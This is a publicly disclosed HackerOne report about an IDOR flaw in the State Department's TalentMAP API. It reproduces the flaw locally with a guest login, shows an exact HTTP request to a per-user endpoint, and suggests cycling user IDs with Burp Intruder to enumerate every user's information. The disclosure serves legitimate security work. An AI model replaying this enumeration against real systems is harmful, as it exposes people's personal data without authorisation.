---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
  - vuln/idor
  - vuln/cors-misconfig
  - vuln/jwt
  - trigger/low-priv-user
  - trigger/cors-origin
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2023-04-11
submitted: 2023-01-26T19:13:04.200Z
bounty_usd: null
votes: 40
cve: []
program: "[[programs/us-department-of-state|U.S. Department of State]]"
reporter: "nhx1"
source: "https://hackerone.com/reports/1848176"
title: "IDOR in TalentMAP API can be abused to enumerate personal information of all the users"
---
# IDOR in TalentMAP API can be abused to enumerate personal information of all the users

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 40 | **Program:** U.S. Department of State | **Disclosed:** 2023-04-11

- Report: [https://hackerone.com/reports/1848176](https://hackerone.com/reports/1848176)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2023-01-26T19:13:04.200Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

I hope you're having a good day. Before starting to describe this vulnerability, I would like to thank the HackerOne triage team for doing the difficult job of triaging all these issues. 

I observed an IDOR vulnerability in one of the endpoints in the Talentmap API. This vulnerability is similar to #1809328. In this report I will demonstrate ways to enumerate all user accounts in the Talentmap API logged in as a guest user. To triage this vulnerability, you need to manually build it in your system, the build instructions can be accessed in the report #1809328 where HackerOne team has successfully built the Talentmap API. However, if you're having issues building it, drop a message!

After building the API, please go inside the docker container and run the following commands to create_seeded_users.

1. `$ python manage.py create_demo_environment` 
2.  `$ python manage.py create_seeded_users`

Also, go into the docker container and create some test users:
1. `$ python manage.py create_user normalUser normaluser@gmail.com normalUser123 Normal User`
2.  `$ python manage.py create_user normalUser1 normaluser1@gmail.com normalUser123 Normal User`
3. `$ python manage.py create_user normalUser2 normaluser2@gmail.com normalUser123 Normal User`

** Some details: **
i. The vulnerable endpoint = http://localhost:8000/api/v1/permission/user/{USER_ID}/  

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. After running the API, browse `http://localhost:8000` and login using the credentials `username: guest , password: guestpassword ` , and copy the token obtained in the respones

{F2139636}

{F2139638}

  2. Send the following request to http://localhost:8000. Replace {USER_ID} to the user id of the user you want to enumerate information of. Replace {token} to the token you obtained in step 1

```
GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1

Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/
JWT: {token}
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

  3. Observe user information returned in the response

Additionally, you could also use Burp intruder to cycle through user-ids from 1 to 100 to get information of all users in the database.

{F2139641}

##Remediation Guidance

Implement access control mechanism. Allow the user to only fetch their information.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

A malicious actor could fetch information of all users and cause a data breach

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Retesting**
- **User Completed Retest**
- **2023-03-02** @nhx1: Hi team,

Like @h1_analyst_ivan mentioned, this vulnerability has been patched.

Thanks
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
